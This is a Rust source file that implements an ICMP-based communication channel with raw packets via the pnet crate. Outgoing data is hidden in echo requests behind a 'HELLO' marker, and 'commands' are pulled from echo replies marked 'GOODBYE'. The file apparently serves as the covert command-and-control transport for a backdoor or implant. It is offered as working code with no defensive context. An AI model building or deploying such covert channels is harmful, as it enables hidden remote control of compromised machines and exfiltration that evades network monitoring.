use pnet::{
    datalink::{
        channel, interfaces, Channel::Ethernet, Config, DataLinkReceiver, DataLinkSender,
        NetworkInterface,
    },
    ipnetwork::IpNetwork,
    packet::{
        ethernet::{EtherType, EthernetPacket, MutableEthernetPacket},
        icmp::{IcmpPacket, IcmpType, MutableIcmpPacket},
        ip::IpNextHeaderProtocol,
        ipv4::{checksum, Ipv4Packet, MutableIpv4Packet},
        Packet,
    },
    util::MacAddr,
};
use std::{
    io::{Read, Write},
    net::{
        IpAddr::{V4, V6},
        Ipv4Addr,
    },
    str::FromStr,
    time::SystemTime,
};

static cmd_init: &[u8; 22] = b"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0HELLO";
static cmd_resp: &[u8; 7] = b"GOODBYE";

pub struct IcmpListener {
    tx: Box<dyn DataLinkSender>,
    rx: Box<dyn DataLinkReceiver>,
    ip_src: Ipv4Addr,
    ip_dst: Ipv4Addr,
    mac_src: MacAddr,
    mac_dst: MacAddr,
}

fn get_addr(interface: &NetworkInterface) -> Ipv4Addr {
    for net in &interface.ips {
        match net {
            IpNetwork::V4(x) => {
                return x.ip();
            }
            IpNetwork::V6(_) => continue,
        }
    }
    panic!("");
}

impl IcmpListener {
    pub fn new(interface_name: String) -> IcmpListener {
        let interface_names_match = |iface: &NetworkInterface| iface.name == interface_name;

        let interfaces = interfaces();
        let interface = interfaces
            .into_iter()
            .filter(interface_names_match)
            .next()
            .unwrap();
        let ip_src: Ipv4Addr = get_addr(&interface);
        let mac_src = interface.mac.unwrap();
        let (tx, rx) = match channel(&interface, Config::default()) {
            Ok(Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unhandled channel type"),
            Err(e) => panic!(
                "An error occurred when creating the datalink channel: {}",
                e
            ),
        };
        let mac_dst = MacAddr::from_str("00:1b:21:11:ed:00").unwrap();

        IcmpListener {
            tx,
            rx,
            ip_src,
            ip_dst: Ipv4Addr::LOCALHOST,
            mac_src,
            mac_dst,
        }
    }

    pub fn set_dest(&mut self, addr: Ipv4Addr) {
        self.ip_dst = addr;
    }
}
impl Read for IcmpListener {
    fn read(&mut self, buffer: &mut [u8]) -> Result<usize, std::io::Error> {
        let start_time = SystemTime::now();
        loop {
            let packet = &self.rx.next()?;
            let eth_packet = EthernetPacket::new(packet).unwrap();

            let ip_packet = Ipv4Packet::new(eth_packet.payload()).unwrap();

            if ip_packet.get_next_level_protocol().0 == 1 {
                let packet = IcmpPacket::new(ip_packet.payload()).unwrap();
                let mut payload = packet.payload().to_vec();
                loop {
                    let byte = payload.get(0).unwrap();
                    if byte == &0 {
                        payload.remove(0);
                    } else {
                        break;
                    }
                }
                if packet.get_icmp_type().0 == 0 {
                    if &payload[0..7] == cmd_resp {
                        let cmd = &payload[7..];
                        let len = cmd.len();
                        for i in 0..len {
                            buffer[i] = cmd[i];
                        }
                        return Ok(len);
                    }
                }
            }
            let current_time = SystemTime::now();
            let dur = current_time.duration_since(start_time).unwrap();
            if dur.as_secs_f64() > 10.0 {
                return Ok(0);
            }
        }
    }
}
impl Write for IcmpListener {
    fn write(&mut self, data: &[u8]) -> Result<usize, std::io::Error> {
        let mut out = Vec::from(data);
        let mut balls = Vec::from(*cmd_init);
        balls.append(&mut out);

        let mut buffer = [0; 1000];
        let mut new_icmp_packet = MutableIcmpPacket::new(&mut buffer).unwrap();
        new_icmp_packet.set_icmp_type(IcmpType::new(8));
        new_icmp_packet.set_payload(&balls);
        let mut buffer = [0; 1060];
        let mut new_ip_packet = MutableIpv4Packet::new(&mut buffer).unwrap();
        new_ip_packet.set_next_level_protocol(IpNextHeaderProtocol::new(1));
        new_ip_packet.set_version(4);
        new_ip_packet.set_ttl(255);
        new_ip_packet.set_flags(0);
        new_ip_packet.set_identification(1);
        new_ip_packet.set_fragment_offset(0);
        new_ip_packet.set_header_length(5);
        new_ip_packet.set_source(self.ip_src);
        new_ip_packet.set_destination(self.ip_dst);
        new_ip_packet.set_total_length((20 + new_icmp_packet.packet().len()).try_into().unwrap());
        new_ip_packet.set_payload(new_icmp_packet.packet());
        new_ip_packet.set_checksum(checksum(&new_ip_packet.to_immutable()));
        let mut buffer = [0; 1080];
        let mut new_packet = MutableEthernetPacket::new(&mut buffer).unwrap();

        new_packet.set_source(self.mac_src);
        new_packet.set_destination(self.mac_dst);
        new_packet.set_ethertype(EtherType::new(0x0800));
        new_packet.set_payload(new_ip_packet.packet());

        let _ = &self.tx.send_to(&new_packet.packet(), None).unwrap();
        return Ok(0);
    }

    fn flush(&mut self) -> Result<(), std::io::Error> {
        todo!()
    }
}
